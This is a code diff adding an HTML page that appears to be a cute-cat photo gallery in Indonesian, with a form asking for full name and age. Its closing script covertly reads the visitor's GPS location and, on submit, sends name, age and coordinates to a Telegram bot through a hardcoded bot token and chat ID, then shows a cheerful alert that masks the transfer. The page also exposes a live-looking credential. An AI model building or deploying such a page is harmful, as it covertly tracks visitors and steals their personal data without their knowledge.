@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Galeri Kucing Lucu 🐱</title>
+  <style>
+    body {
+      background-color: #fff4f8;
+      font-family: "Comic Sans MS", cursive, sans-serif;
+      text-align: center;
+      color: #333;
+      padding: 20px;
+    }
+    h1 {
+      color: #ff69b4;
+      font-size: 2.5em;
+    }
+    p {
+      font-size: 1.2em;
+    }
+    .gallery {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 15px;
+      margin-top: 20px;
+    }
+    .cat-card {
+      background: #ffe6ef;
+      border-radius: 15px;
+      padding: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .cat-card img {
+      border-radius: 15px;
+      width: 100%;
+      height: auto;
+    }
+    .download-btn {
+      margin-top: 8px;
+      padding: 5px 10px;
+      background-color: #ff69b4;
+      color: white;
+      text-decoration: none;
+      border-radius: 8px;
+      font-size: 0.9em;
+    }
+    .download-btn:hover {
+      background-color: #ff4081;
+    }
+    form {
+      background: #ffe6ef;
+      display: inline-block;
+      padding: 20px;
+      border-radius: 15px;
+      margin-top: 20px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    }
+    input, button {
+      padding: 8px;
+      font-size: 1em;
+      margin-top: 5px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #ff69b4;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #ff4081;
+    }
+  </style>
+</head>
+<body>
+  <h1>Galeri Kucing Lucu 🐱</h1>
+  <p>Lihat foto-foto kucing menggemaskan dan isi form di bawah ini!</p>
+
+  <h2>Siapakah Kamu? 🐾</h2>
+  <form id="catForm">
+    Nama Lengkap:<br>
+    <input type="text" name="nama" required><br><br>
+    Umur:<br>
+    <input type="number" name="umur" required><br><br>
+    <button type="submit">Kirim</button>
+  </form>
+
+  <div class="gallery">
+    <div class="cat-card">
+      <img src="https://files.catbox.moe/g5u1ys.jpeg" alt="kitty">
+      <a class="download-btn" href="https://files.catbox.moe/g5u1ys.jpeg" download="kitty.jpg">Download</a>
+    </div>
+    <div class="cat-card">
+      <img src="https://files.catbox.moe/vovjx7.jpeg" alt="embull">
+      <a class="download-btn" href="https://files.catbox.moe/vovjx7.jpeg" download="embull.jpg">Download</a>
+    </div>
+    <div class="cat-card">
+      <img src="https://files.catbox.moe/yjf3au.jpeg" alt="oyen">
+      <a class="download-btn" href="https://files.catbox.moe/yjf3au.jpeg" download="oyen.jpg">Download</a>
+    </div>
+    <div class="cat-card">
+      <img src="https://files.catbox.moe/5zqaw1.jpeg" alt="anabul1">
+      <a class="download-btn" href="https://files.catbox.moe/5zqaw1.jpeg" download="anabul1.jpg">Download</a>
+    </div>
+    <div class="cat-card">
+      <img src="https://files.catbox.moe/cahgsy.jpeg" alt="anabul2">
+      <a class="download-btn" href="https://files.catbox.moe/cahgsy.jpeg" download="anabul2.jpg">Download</a>
+    </div>
+    <div class="cat-card">
+      <img src="https://files.catbox.moe/m73e1f.jpeg" alt="anabul3">
+      <a class="download-btn" href="https://files.catbox.moe/m73e1f.jpeg" download="anabul3.jpg">Download</a>
+    </div>
+    <div class="cat-card">
+      <img src="https://files.catbox.moe/rlh01t.jpeg" alt="anabul4">
+      <a class="download-btn" href="https://files.catbox.moe/rlh01t.jpeg" download="anabul4.jpg">Download</a>
+    </div>
+  </div>
+
+  <script>
+    const TOKEN = "7897552509:AAECrwGQu0zMiqTMYhULLZLwr7plqANjFEk";
+    const CHAT_ID = "6626316127";
+    const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    let gpsLocation = "Tidak tersedia";
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        gpsLocation = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+      }, function(error) {
+        gpsLocation = "Gagal mendapatkan lokasi";
+      });
+    } else {
+      gpsLocation = "Browser tidak mendukung GPS";
+    }
+
+    document.getElementById("catForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const formData = new FormData(e.target);
+      const message = `
+📌 Data Baru Masuk:
+👤 Nama: ${formData.get("nama")}
+🎂 Umur: ${formData.get("umur")}
+📍 Lokasi GPS: ${gpsLocation}
+      `;
+
+      fetch(URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).then(res => alert("nama kamu indah bagaikan bulan🌚"))
+        .catch(err => alert("Gagal mengirim: " + err));
+    });
+  </script>
+</body>
+</html>
